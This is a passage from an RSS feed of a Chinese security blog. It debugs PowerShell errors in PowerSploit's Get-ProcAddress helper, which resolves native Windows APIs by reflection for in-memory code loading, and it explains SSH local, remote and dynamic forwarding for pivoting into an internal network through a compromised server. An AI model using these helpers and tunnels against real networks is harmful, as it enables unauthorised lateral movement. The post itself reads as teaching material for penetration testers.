&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;使用&lt;span style="color:#960050;background-color:#1e0010"&gt;“&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;”&lt;/span&gt;个参数调用&lt;span style="color:#960050;background-color:#1e0010"&gt;“&lt;/span&gt;GetMethod&lt;span style="color:#960050;background-color:#1e0010"&gt;”&lt;/span&gt;时发生异常&lt;span style="color:#960050;background-color:#1e0010"&gt;:“&lt;/span&gt;发现不明确的匹配&lt;span style="color:#960050;background-color:#1e0010"&gt;。”&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;所在位置 行&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;886&lt;/span&gt; 字符&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;+ $GetProcAddress = $UnsafeNativeMethods.GetMethod(&lt;span style="color:#960050;background-color:#1e0010"&gt;&amp;#39;&lt;/span&gt;GetProcAddr ...
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; + CategoryInfo &lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; NotSpecified&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; (&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;) [], MethodInvocationException
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; + FullyQualifiedErrorId &lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; AmbiguousMatchException
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;不能对 Null 值表达式调用方法&lt;span style="color:#960050;background-color:#1e0010"&gt;。&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;所在位置 行&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;893&lt;/span&gt; 字符&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;+ Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; + CategoryInfo &lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; InvalidOperation&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; (&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;) []&lt;span style="color:#960050;background-color:#1e0010"&gt;，&lt;/span&gt;RuntimeException
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; + FullyQualifiedErrorId &lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; InvokeMethodOnNull
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;找不到&lt;span style="color:#960050;background-color:#1e0010"&gt;“&lt;/span&gt;GetDelegateForFunctionPointer&lt;span style="color:#960050;background-color:#1e0010"&gt;”&lt;/span&gt;的重载&lt;span style="color:#960050;background-color:#1e0010"&gt;，&lt;/span&gt;参数计数为&lt;span style="color:#960050;background-color:#1e0010"&gt;:“&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;”。&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;所在位置 行&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;489&lt;/span&gt; 字符&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;+ $VirtualAlloc = [&lt;span style="color:#66d9ef"&gt;System.Runtime.InteropServices.Marshal&lt;/span&gt;]::Get ...
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; + CategoryInfo &lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; NotSpecified&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; (&lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt;) [], MethodException
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; + FullyQualifiedErrorId &lt;span style="color:#960050;background-color:#1e0010"&gt;:&lt;/span&gt; MethodCountCouldNotFindBest
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;.............
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...省略n行...
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;.............
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="link" href="https://github.com/PowerShellMafia/PowerSploit/issues/293" target="_blank" rel="noopener"
&gt;解决方法&lt;/a&gt;：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;请尝试更改该行：
$GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;)
至
$GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;, [reflection.bindingflags] &amp;#34;Public,Static&amp;#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;报错分析：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;报错的第886行代码为&lt;code&gt;$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')&lt;/code&gt;,它存在如下函数中：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;Function&lt;/span&gt; Get-ProcAddress
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;Param&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; [OutputType([&lt;span style="color:#66d9ef"&gt;IntPtr&lt;/span&gt;])]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; [Parameter( &lt;span style="color:#a6e22e"&gt;Position&lt;/span&gt; = &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, &lt;span style="color:#a6e22e"&gt;Mandatory&lt;/span&gt; = $True )]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; [&lt;span style="color:#66d9ef"&gt;String&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $Module,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; [Parameter( &lt;span style="color:#a6e22e"&gt;Position&lt;/span&gt; = &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#a6e22e"&gt;Mandatory&lt;/span&gt; = $True )]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; [&lt;span style="color:#66d9ef"&gt;String&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $Procedure
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# Get a reference to System.dll in the GAC&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $SystemAssembly = [&lt;span style="color:#66d9ef"&gt;AppDomain&lt;/span&gt;]::CurrentDomain.GetAssemblies() |
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Where-Object { $_.GlobalAssemblyCache &lt;span style="color:#f92672"&gt;-And&lt;/span&gt; $_.Location.Split(&lt;span style="color:#e6db74"&gt;&amp;#39;\\&amp;#39;&lt;/span&gt;)[&lt;span style="color:#ae81ff"&gt;-1&lt;/span&gt;].Equals(&lt;span style="color:#e6db74"&gt;&amp;#39;System.dll&amp;#39;&lt;/span&gt;) }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $UnsafeNativeMethods = $SystemAssembly.GetType(&lt;span style="color:#e6db74"&gt;&amp;#39;Microsoft.Win32.UnsafeNativeMethods&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# Get a reference to the GetModuleHandle and GetProcAddress methods&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $GetModuleHandle = $UnsafeNativeMethods.GetMethod(&lt;span style="color:#e6db74"&gt;&amp;#39;GetModuleHandle&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $GetProcAddress = $UnsafeNativeMethods.GetMethod(&lt;span style="color:#e6db74"&gt;&amp;#39;GetProcAddress&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# $GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;, [reflection.bindingflags] &amp;#34;Public,Static&amp;#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# Get a handle to the module specified&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $tmpPtr = New-Object IntPtr
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;# Return the address of the function&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Write-Output $GetProcAddress.Invoke($null, @([&lt;span style="color:#66d9ef"&gt;System.Runtime.InteropServices.HandleRef&lt;/span&gt;]$HandleRef, $Procedure))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该行代码由于在执行$UnsafeNativeMethods.GetMethod(&amp;lsquo;GetProcAddress&amp;rsquo;)的时候，$UnsafeNativeMethods有两个方法名都是GetProcAddress，显然是方法的重载，所以GetMethod(&amp;lsquo;GetProcAddress&amp;rsquo;)无法确定返回哪个方法，所以出现错误。powershell和其他shell一样，代码执行出错抛出异常后会继续执行后面的代码。它不像python、php这些脚本语言，抛出异常后会终止程序。所以后面的报错是因为第一个错误产生的。&lt;/p&gt;
&lt;p&gt;以下是$UnsafeNativeMethods.GetMethod(&amp;lsquo;GetProcAddress&amp;rsquo;)的两个可能的值，必须想办法让它确定下来，方法之一则是“暂时解决办法”提到的那样。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;Name : GetProcAddress
DeclaringType : Microsoft.Win32.UnsafeNativeMethods
ReflectedType : Microsoft.Win32.UnsafeNativeMethods
MemberType : Method
MetadataToken : 100663839
Module : System.dll
IsSecurityCritical : True
IsSecuritySafeCritical : True
IsSecurityTransparent : False
MethodHandle : System.RuntimeMethodHandle
Attributes : PrivateScope, Public, Static, HideBySig, PinvokeImpl
CallingConvention : Standard
ReturnType : System.IntPtr
ReturnTypeCustomAttributes : IntPtr
ReturnParameter : IntPtr
IsGenericMethod : False
IsGenericMethodDefinition : False
ContainsGenericParameters : False
MethodImplementationFlags : PreserveSig
IsPublic : True
IsPrivate : False
IsFamily : False
IsAssembly : False
IsFamilyAndAssembly : False
IsFamilyOrAssembly : False
IsStatic : True
IsFinal : False
IsVirtual : False
IsHideBySig : True
IsAbstract : False
IsSpecialName : False
IsConstructor : False
CustomAttributes : {[System.Runtime.InteropServices.DllImportAttribute(&amp;#34;kernel32.dll&amp;#34;, EntryPoint = &amp;#34;GetProcAddress&amp;#34;, CharSet = 2, ExactSpelling = True, SetLastError = True, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]}
Name : GetProcAddress
DeclaringType : Microsoft.Win32.UnsafeNativeMethods
ReflectedType : Microsoft.Win32.UnsafeNativeMethods
MemberType : Method
MetadataToken : 100663864
Module : System.dll
IsSecurityCritical : True
IsSecuritySafeCritical : True
IsSecurityTransparent : False
MethodHandle : System.RuntimeMethodHandle
Attributes : PrivateScope, Public, Static, HideBySig, PinvokeImpl
CallingConvention : Standard
ReturnType : System.IntPtr
ReturnTypeCustomAttributes : IntPtr
ReturnParameter : IntPtr
IsGenericMethod : False
IsGenericMethodDefinition : False
ContainsGenericParameters : False
MethodImplementationFlags : PreserveSig
IsPublic : True
IsPrivate : False
IsFamily : False
IsAssembly : False
IsFamilyAndAssembly : False
IsFamilyOrAssembly : False
IsStatic : True
IsFinal : False
IsVirtual : False
IsHideBySig : True
IsAbstract : False
IsSpecialName : False
IsConstructor : False
CustomAttributes : {[System.Runtime.InteropServices.DllImportAttribute(&amp;#34;kernel32.dll&amp;#34;, EntryPoint = &amp;#34;GetProcAddress&amp;#34;, CharSet = 2, ExactSpelling = False, SetLastError = False, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]}
&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>SSH隧道转发</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/</guid><description>&lt;img src="https://runshell.github.io/images/1536460373438.png" alt="Featured image of post SSH隧道转发" /&gt;&lt;h2 id="0x00-ssh常用参数说明"&gt;0x00 ssh常用参数说明
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-C 压缩传输数据,加快传输速度
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-f 后台对用户名密码进行认证
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-N 仅仅只用来转发,不用再弹回一个新的shell
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-n 后台运行
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-q 安静模式,不要显示警告等信息
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-l 指定ssh登录名
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-g 允许远程主机连接到本地转发的端口（本机监听地址设为0.0.0.0，不选则为127.0.0.1）
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-L 进行本地端口转发
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-R 进行远程端口转发
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-D 动态转发,即socks代理
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-T 禁止分配伪终端
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-p 指定远程ssh服务端口
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x01-本地转发"&gt;0x01 本地转发
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ssh &lt;span style="color:#f92672"&gt;[&lt;/span&gt;-C&lt;span style="color:#f92672"&gt;]&lt;/span&gt; &lt;span style="color:#f92672"&gt;[&lt;/span&gt;-f&lt;span style="color:#f92672"&gt;]&lt;/span&gt; &lt;span style="color:#f92672"&gt;[&lt;/span&gt;-N&lt;span style="color:#f92672"&gt;]&lt;/span&gt; &lt;span style="color:#f92672"&gt;[&lt;/span&gt;-g&lt;span style="color:#f92672"&gt;]&lt;/span&gt; -L &lt;span style="color:#f92672"&gt;[&lt;/span&gt;本机ip&lt;span style="color:#f92672"&gt;]&lt;/span&gt;:本机端口:vps能访问的主机ip:端口 &amp;lt;user@vps&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将本地的一个端口映射到vps能到达的主机的一个端口。如果vps是边界设备，拥有多网卡，那么就可以用该方法访问内网主机的服务。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;例：假如你拥有一台web服务器的控制权，但是数据库服务器没有公网IP，你想直接访问数据库的服务，这时就可以使用本地转发，在本地（local）执行如下命令：&lt;/p&gt;&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ssh -Nnf -L 6666:10.10.10.12:3306 root@188.224.123.45
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#访问本地的6666端口就可以被映射到数据库10.10.10.12的3306端口&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mysql -u root -ppassword -P &lt;span style="color:#ae81ff"&gt;6666&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;序列图如下：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://runshell.github.io/images/1536460373438.png"
loading="lazy"
alt="1536460373438"
&gt;&lt;/p&gt;
&lt;h2 id="0x02-远程转发"&gt;0x02 远程转发
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ssh -C -f -N -R 0.0.0.0:vps_port:本机能访问的IP:端口 root@vps
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将vps上的一个端口映射到本机能到达的主机的一个端口。以至于可以通过vps访问内网的计算机上面的服务。遗憾的是，即使你指定了监听地址为0.0.0.0，它也仅能监听127.0.0.1，不能实现内网穿透。&lt;/p&gt;
&lt;p&gt;然后经过一番折腾，得出答案，需要修改sshd的配置文件&lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;,将配置做如下修改：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-config" data-lang="config"&gt;GatewayPorts yes
&lt;/code&gt;&lt;/pre&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#重启sshd服务&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;service sshd restart &lt;span style="color:#f92672"&gt;||&lt;/span&gt; systemctl restart sshd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x03-动态转发"&gt;0x03 动态转发
&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ssh -qTfnN -D 0.0.0.0:1080 root@vps -p &lt;span style="color:#ae81ff"&gt;22&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本机将本地1080端口的所有流量发给vps，vps转发收到的流量。这就是赤裸裸的socks代理啊。&lt;/p&gt;</description></item></channel></rss>